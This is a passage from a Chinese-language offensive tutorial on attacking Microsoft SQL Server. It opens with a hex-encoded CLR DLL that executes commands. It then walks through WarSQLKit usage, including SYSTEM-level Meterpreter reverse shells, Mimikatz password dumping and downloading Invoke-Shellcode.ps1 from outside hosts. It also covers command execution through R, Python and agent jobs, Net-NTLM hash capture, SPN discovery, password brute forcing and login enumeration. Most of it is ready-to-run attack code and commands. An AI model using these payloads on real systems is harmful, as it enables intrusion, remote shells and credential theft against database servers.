    FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103006E587C5E0000000000000000E00022200B013000000E00000006000000000000522C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000002C00004F00000000400000A802000000000000000000000000000000000000006000000C000000C82A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000580C000000200000000E000000020000000000000000000000000000200000602E72737263000000A8020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000342C00000000000048000000020005007C2200004C0800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000A8020000237E000014030000B403000023537472696E677300000000C8060000B4000000235553007C0700001000000023475549440000008C070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000D60101000000000006007001BA0206009001BA0206004601A7020F00DA02000006003C03E4010A005A015A020E001503A7020600EB01E40106002C027A0306002B01BA020E00FA02A7020A0086035A020A0023015A020600C401E4010E000302A7020E00D200A7020E004102A70206001402400006002102400006003100E401000000003700000000000100010001001000E9020000150001000100030110000100000015000100040006007003790050200000000096008D007D000100842000000000960099001A0002005C22000000008618A102060004005C22000000008618A102060004006522000000008300160082000400000001007F0000000100F200000002002B03000001003A020000020010030900A10201001100A10206001900A1020A003100A10206005100A102060061001A0110006900A4001500710035031A003900A10206003900F50132007900E50015007100A403370079001D031500790091033C007900C20041007900AE013C00790087023C00790055033C004900A10206008900A1024700390068004D0039004F0353003900FB000600390075025700990083005C003900430306004100B6005C003900A90060002900C2015C0049000F0164004900CB016000A100C2015C00710035036A002900A1020600590056005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA0020000480000000000000000000000000000000002700000004000000000000000000000070005F000000000004000000000000000000000070004A00000000000400000000000000000000007000E40100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F300044617461626173653100496E743332003C4D6F64756C653E0053797374656D2E494F0053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E677468004461746162617365312E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D707479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A0020000000593C457501949B4EAC85A8875A6084DC000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301080100070100000000040100000000000000006E587C5E00000000020000001C010000E42A0000E40C000052534453CEC8B2762812304EAEE7EF5EE4D9EC7901000000463A5C746F6F6C735F736F757263655C4461746162617365315C4461746162617365315C6F626A5C44656275675C4461746162617365312E706462000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000282C00000000000000000000422C0000002000000000000000000000000000000000000000000000342C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E0061006D00650000004400610074006100620061007300650031002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000004400610074006100620061007300650031002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000543C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    WITH PERMISSION_SET = UNSAFE;
GO
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110620-b63dfe06-a317-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110620-b63dfe06-a317-1.png)

创建存储过程

```
CREATE PROCEDURE [dbo].[ExecCommand]
@cmd NVARCHAR (MAX)
AS EXTERNAL NAME [Database1].[StoredProcedures].[ExecCommand]
go
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110639-c18f3216-a317-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110639-c18f3216-a317-1.png)

#### 利用 CLR 执行命令

```
exec dbo.ExecCommand "whoami /all";
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110652-c95fb7f4-a317-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110652-c95fb7f4-a317-1.png)

#### WarSQLKit

WarSQLKit 是一个针对 MSSQL CLR 进行利用的工具，有以下两个版本。

*   WarSQLKit 是完全版本，内置多种功能。
*   WarSQLKitMinimal 是简化版，只能执行命令。

```
https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit
```

#### 导入 WarSQLKit DLL 文件

利用 16 进制文件流方式导入 WarSQLKit.dll 文件。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110702-cfa52cfc-a317-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110702-cfa52cfc-a317-1.png)

```
CREATE ASSEMBLY [WarSQLKit]
    AUTHORIZATION [dbo]
    FROM 0x4D5A......
    WITH PERMISSION_SET = UNSAFE;
GO
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110715-d71769c8-a317-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110715-d71769c8-a317-1.png)

创建存储过程

```
CREATE PROCEDURE sp_cmdExec
@Command [nvarchar](max)
WITH EXECUTE AS CALLER
AS
EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec
GO
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110726-dd95cf60-a317-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110726-dd95cf60-a317-1.png)

#### WarSQLKit 执行命令

WarSQLKit CmdExec 实现了以下功能

执行任意 Windows 命令

```
EXEC sp_cmdExec 'whoami';
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111838-6e4905ee-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111838-6e4905ee-a319-1.png)

以 SYSTEM 权限执行 Windows 命令

```
EXEC sp_cmdExec 'whoami /RunSystemPriv';
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113245-6743bdfa-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113245-6743bdfa-a31b-1.png)

以 SYSTEM 权限运行 PowerShell 命令

```
EXEC sp_cmdExec 'powershell Get-ChildItem /RunSystemPS';
```

生成以 SYSTEM 权限运行的 X86 Meterpreter 反向连接 shell

```
EXEC sp_cmdExec 'sp_meterpreter_reverse_tcp LHOST LPORT GetSystem';
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113329-81186104-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113329-81186104-a31b-1.png)

生成以 SYSTEM 权限运行的 X64 Meterpreter 反向连接 shell

```
EXEC sp_cmdExec 'sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem';
```

生成以 SYSTEM 权限运行的 X64 Meterpreter RC4 反向连接 shell

```
EXEC sp_cmdExec 'sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem'
RC4PASSWORD=123456
```

生成以 SYSTEM 权限运行的 X86 Meterpreter_bind_tcp shell

```
EXEC sp_cmdExec 'sp_meterpreter_bind_tcp LPORT GetSystem';
```

每次使用 Meterpreter 反弹都会创建一个 reverse 进程

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113053-248e4ade-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113053-248e4ade-a31b-1.png)

运行 Mimikatz 功能抓取密码

```
exec sp_cmdExec 'sp_Mimikatz';
select * from WarSQLKitTemp //获取Mimikatz日志
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113345-8afda21a-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113345-8afda21a-a31b-1.png)

文件下载

```
EXEC sp_cmdExec 'sp_downloadFile http://test.com/Invoke--Shellcode.ps1 C:\test\Invoke--Shellcode.ps1 300';
EXEC sp_cmdExec 'sp_downloadFile http://10.251.0.33/Invoke--Shellcode.ps1 C:\test\Invoke--Shellcode.ps1 300';
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113402-953d8272-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113402-953d8272-a31b-1.png)

获取 MSSQL Hash

```
EXEC sp_cmdExec 'sp_getSqlHash';
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113414-9c376c1e-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113414-9c376c1e-a31b-1.png)

获取 Windows Product

```
EXEC sp_cmdExec 'sp_getProduct';
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113427-a3ce1f68-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113427-a3ce1f68-a31b-1.png)  
获取可用的数据库

```
EXEC sp_cmdExec 'sp_getDatabases';
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113304-7288d0d8-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113304-7288d0d8-a31b-1.png)

### SQL Server R 和 Python 的利用

SQL Server 2017 加入了 Microsoft 机器学习服务，该服务允许通过 SQL Server 中`sp_execute_external_script`执行 Python 和 R 脚本

利用条件：

*   Machine Learning Services 必须要在 Python 安装过程中选择
    
*   必须启用外部脚本
    
    ```
    EXEC sp_configure 'external scripts enabled', 1
    RECONFIGURE WITH OVERRIDE
    ```
    
    *   重新启动数据库服务器
*   用户拥有执行任何外部脚本权限
    

#### R 脚本利用

利用 R 执行命令：

```
sp_configure 'external scripts enabled'
GO
EXEC sp_execute_external_script
@language=N'R',
@script=N'OutputDataSet <- data.frame(system("cmd.exe
/c dir",intern=T))'
WITH RESULT SETS (([cmd_out] text));
GO
```

利用 R 抓取 Net-NTLM 哈希：

```
@script=N'.libPaths("\\\\testhost\\foo\\bar");library("0mgh4x")'
```

#### Python 脚本利用

Python ：

```
exec sp_execute_external_script 
@language =N'Python',
@script=N'import sys
OutputDataSet = pandas.DataFrame([sys.version])'
WITH RESULT SETS ((python_version nvarchar(max)))
```

执行命令：

```
exec sp_execute_external_script 
@language =N'Python',
@script=N'import subprocess
p = subprocess.Popen("cmd.exe /c whoami", stdout=subprocess.PIPE)
OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])'
WITH RESULT SETS (([cmd_out] nvarchar(max)))
```

### SQL Server 代理执行计划任务

SQL Server 代理是一项 Microsoft Windows 服务，它执行计划的管理任务。

首先启动 SQL Server 代理服务。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113110-2eb3afae-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113110-2eb3afae-a31b-1.png)

执行计划任务。

```
USE msdb; 
EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 
EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'c:\windows\system32\cmd.exe /c whoami /all >c:\\123.txt', @retry_attempts = 1, @retry_interval = 5 ;
EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 
EXEC dbo.sp_start_job N'test_powershell_job1';
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112354-2a9b9a36-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112354-2a9b9a36-a31a-1.png)

攻击方实战思路分析
---------

第三章简单介绍了 SQL Server 中常见的一写利用点，接下来介绍这些利用面在各个攻击阶段中的应用和一些思路。

### SQL Server 实例发现

SQL Server 的实例发现，本地实例主要是通过检查系统服务和注册表方式。远程实例可以通过扫描 TDS 监听服务、UDP 广播、SPN 服务等方式。

常见的几种实例发现工具：

*   [osql](https://docs.microsoft.com/en-us/sql/tools/osql-utility?view=sql-server-2017)

```
osql -L
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111910-81a59292-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111910-81a59292-a319-1.png)

*   [sqlcmd](https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-2017)

```
sqlcmd -L
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111933-8f5b5b88-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111933-8f5b5b88-a319-1.png)

*   [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

```
import-module .\PowerUPSQL.psd1 //加载模块
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112319-15cf384c-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112319-15cf384c-a31a-1.png)

```
Get-SQLInstanceBroadcast  //SQL Server实例发现
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112331-1cff3aea-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112331-1cff3aea-a31a-1.png)

*   [SQLPing3](http://www.sqlsecurity.com/downloads)
*   Metasploit mssql_ping module
    
*   Nmap
    
*   Nessus
*   ……

#### 本地实例发现

作为本地用户，主要是通过检查系统服务和注册表设置来标识 SQL Server 实例。

检查系统服务

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111955-9c2bd6d0-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111955-9c2bd6d0-a319-1.png)

检查注册表键值，也可判断 SQL Server 实例

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server" /v InstalledInstances
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112141-db57e434-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112141-db57e434-a319-1.png)

使用 PowerUpSQL，来识别本地实例。

```
import-module .\PowerUPSQL.psd1 //加载模块
Get-SQLInstanceLocal  //SQL Server实例发现
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112046-baa09268-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112046-baa09268-a319-1.png)

#### 远程实例发现

```
Get-SQLInstanceBroadcast -Verbose //UDP广播Ping
Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1 //UDP端口扫描 
Get-SQLInstanceFile -FilePath c:\temp\computers.txt | Get-SQLInstanceScanUDPThreaded -Verbose //从文件获取实例列表
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112256-08230f84-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112256-08230f84-a31a-1.png)

#### 域内实例发现

域内实例主要利用 SPN 扫描发现实例，先简单介绍一下什么是 SPN 服务。

#### SPN 服务

Windows 域环境是基于活动目录（Active Directory）服务工作的。为了在域环境中有效地对资源访问权限进行精细控制，提高网络环境的安全性和方便网络资源统一分配管理。系统给域内每种资源分配了不同的服务主体名称（Service Principal Name, SPN）。使用 Kerberos 协议进行身份验证的域环境中，本地账号 SPN 将自动注册，但是，域内用户账号下运行的服务，必须为此域内账户手动注册。如下图 SQL Server 服务运行在域内用户时的状态。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112201-e77b45bc-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112201-e77b45bc-a319-1.png)

因为域中每台机器都要在 Kerberos 身份验证服务中注册 SPN，所以攻击者可以向域控制器（AD）发送请求，获取 SPN 相关信息，得到某个服务资源在哪台服务器上。

SQL Server 服务的 SPN 示例：

```
TERMSRV/MSSQL2.sec.com:1433
服务组件名称/主机名.域名:监听端口
```

域内用户账号下运行的服务，手动注册 SPN

```
setspn -A MSSQLSvc/MSSQL2.sec.com:1433 mssqluser
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112223-f464fa66-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112223-f464fa66-a319-1.png)

更多 SPN 相关介绍请查看：[https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spn-setspn-syntax.aspx](https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spn-setspn-syntax.aspx)

域中安装的 SQL Server 会使用关联的服务帐户自动在活动目录（Active Directory）中注册，以支持 Kerberos 身份验证。可以使用以下方式识别实例：

```
setspn -q */*
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112235-fb5d2f50-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112235-fb5d2f50-a319-1.png)

*   [setspn.exe](https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx)。
    
*   [adfind.exe](http://www.joeware.net/freetools/tools/adfind/index.htm)。
    
*   [Get-Spn.psm1](https://github.com/nullbind/Powershellery/blob/master/Stable-ish/Get-SPN/Get-SPN.psm1)。
    
*   [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
    
    ```
    Get-SQLInstanceDomain
    ```
    

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112436-43e5a75c-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112436-43e5a75c-a31a-1.png)

PowerUpSQL 其他发现实例命令

<table><thead><tr><th>描述</th><th>命令</th></tr></thead><tbody><tr><td>使用备用域凭据发现 Active Directory 域 SQL Server 实例</td><td>runas /noprofile /netonly /user:domain\user PowerShell.exe import-module PowerUpSQL.psd1<code></code>Get-SQLInstanceDomain -Verbose -DomainController 192.168.1.1 -Username domain\user -password Password123</td></tr><tr><td>列出使用特定域帐户的 SQL Server 实例</td><td>Get-SQLInstanceDomain -Verbose -DomainAccount mssqluser</td></tr><tr><td>列出共享域用户 SQL Server 服务帐户</td><td>Get-SQLInstanceDomain -Verbose \</td><td>Group-Object DomainAccount \</td><td>Sort-Object count -Descending \</td><td>select Count,Name \</td><td>Where-Object {($<em>.name -notlike "$") -and ($</em>.count -gt 1) }</td></tr></tbody></table>

### SQL Server 口令爆破

连接测试，两种功能均可用于测试。

```
Get-SQLConnectionTestThreaded
Invoke-SQLAuditWeakLoginPw
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112125-d2226bdc-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112125-d2226bdc-a319-1.png)

爆破必须的几个条件：

*   常见的弱密码
*   当前的本地用户访问权限
*   当前域用户访问权限
*   备用域用户访问权限

使用 msf 来执行爆破

```
use auxiliary/scanner/mssql/mssql_login
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422110742-e710aaf6-a317-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422110742-e710aaf6-a317-1.png)

PowerUpSQL 其他获取账户相关命令：

<table><thead><tr><th>描述</th><th>命令</th></tr></thead><tbody><tr><td>获取可用提供的 SQL Server 登录名登录的域 SQL Server 列表。</td><td>$Targets = Get-SQLInstanceDomain -Verbose \</td><td>Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username testuser -password testpass \</td><td>Where-Object {$_.Status -like "Accessible"} $Targets</td></tr><tr><td>获取可以使用当前域帐户登录的域 SQL 服务器的列表。</td><td>$Targets = Get-SQLInstanceDomain -Verbose \</td><td>Get-SQLConnectionTestThreaded -Verbose -Threads 10 \</td><td>Where-Object {$_.Status -like "Accessible"} $Targets</td></tr><tr><td>获取可以使用备用域帐户登录的域 SQL 服务器的列表。</td><td>runas /noprofile /netonly /user:domain\user PowerShell.exe<code></code>Get-SQLInstanceDomain \</td><td>Get-SQLConnectionTestThreaded -Verbose -Threads 15</td></tr><tr><td>获取可以使用非域系统中的备用域帐户登录的域 SQL 服务器的列表。</td><td>runas /noprofile /netonly /user:domain\user PowerShell.exe<code></code>Get-SQLInstanceDomain -Verbose -Username 'domain\user' -Password 'MyPassword!' -DomainController 10.1.1.1 \</td><td>Get-SQLConnectionTestThreaded -Verbose -Threads 15</td></tr><tr><td>发现域 SQL Server，并根据实例名称确定它们是否配置有普通应用程序使用的默认密码。</td><td>Get-SQLInstanceDomain \</td><td>Get-SQLServerLoginDefaultPw -Verbose</td></tr></tbody></table>

### SQL Server 权限提升

权限提升基本的一个思路：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112512-58e2fd1c-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112512-58e2fd1c-a31a-1.png)

域用户可以到处登录的前置条件。

*   添加了域用户
*   已添加本地用户
*   特权继承

获得 Sysadmin 权限的一些利用点：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112530-64242598-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112530-64242598-a31a-1.png)

#### 获得低权限账号

可以使用常用的凭据执行爆破，但要注意帐户锁定。

以 PowerUpSQL 为例：

```
import-module .\PowerUPSQL.psd1 //加载模块。
Get-SQLInstanceScanUDP | Invoke-SQLAuditWeakLoginPw //从未经身份验证的用户角度发起攻击。
Get-SQLInstanceDomain | Invoke-SQLAuditWeakLoginPw //从域用户角度开始攻击。
Get-SQLInstanceScanUDP | Get-SQLConnectionTestThreaded -Username <USERNAME> -Password <PASSWORD> //手动连接到已标识的SQL Server实例。
```

许多使用 SQL Server Express 作为后端的应用程序都是使用特定的凭据和实例名称配置的。使用以下命令检查这些凭据：

```
import-module .\PowerUPSQL.psd1 //加载模块。
Get-SQLInstanceDomain | Invoke-SQLAuditDefaultLoginPw
Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw
```

如果与 SQL Server 的通信未加密，我们可以执行 MITM 攻击来注入们自己的查询。根据欺骗的用户特权，我们可以注入 SQL 登录名。

*   [sqlmitm.py](https://gist.github.com/anonymous/edb02df90942dc4df0e41f3cbb78660b)

#### 使用本地或域用户账号

尝试使用当前帐户登录到 SQL Server。过多的登录特权是常见的配置。

```
import-module .\PowerUpSQL.psd1
Get-SQLInstanceDomain | Get-SQLConnectionTest
Get-SQLInstanceLocal | Get-SQLConnectionTest
```

#### 从 Public 到 Sysadmin

猜测弱密码获得高权限角色账号，一般需要以下两步：

*   枚举登录名
*   猜测密码

**1. 枚举登录名**

默认情况下，Public 角色成员不能选择本地列表登录，但可以进行 Fuzz 登录名。如果尝试枚举所有 SQL Server 登录名枚举，则只会看到其中一部分。查询出所有 SQL Server 登录名：

```
SELECT name FROM sys.syslogins
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112602-76d6102a-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112602-76d6102a-a31a-1.png)

```
SELECT name FROM sys.server_principals
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112617-7f9dafe2-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112617-7f9dafe2-a31a-1.png)

suser_name 返回给定主体 ID 的主体名称。可以通过使用 Public 角色，在 suser_name 函数中枚举主体 ID 值来标识 SQL 登录名。查询示例：

```
SELECT SUSER_NAME(1)
SELECT SUSER_NAME(2)
SELECT SUSER_NAME(3)
SELECT SUSER_NAME(4)
...
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112633-89974c38-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112633-89974c38-a31a-1.png)

**2. 猜测密码**

使用 PowerUpSQL 尝试对那些已识别出的的 SQL Server 登录名使用弱口令爆破。

```
Get-SQLFuzzServerLogin -Instance ComputerNAme\InstanceName  //PowerUpSQL Blind SQL登录枚举
Invoke-SQLAuditWeakLoginPw
```

**3. 获取当前域内用户名**

public 角色可以获取当前域信息，有利用盲猜域内其他组 SID 或用户名。

获取 SQL Server 所在的域：

```
SELECT DEFAULT_DOMAIN() as mydomain
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112649-92b1a3ea-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112649-92b1a3ea-a31a-1.png)

获取域内用户的完整 SID。

```
SELECT SUSER_SID('<Identified_Domain>\Domain Admins')
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112704-9bc4ddbc-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112704-9bc4ddbc-a31a-1.png)

```
0x010500000000000515000000CAAE870FA5F89ACD856A619851040000
```

获取域内 Admins 组的完整 RID。

```
SELECT SUSER_SID('<Identified_Domain>\Domain Admins')
```

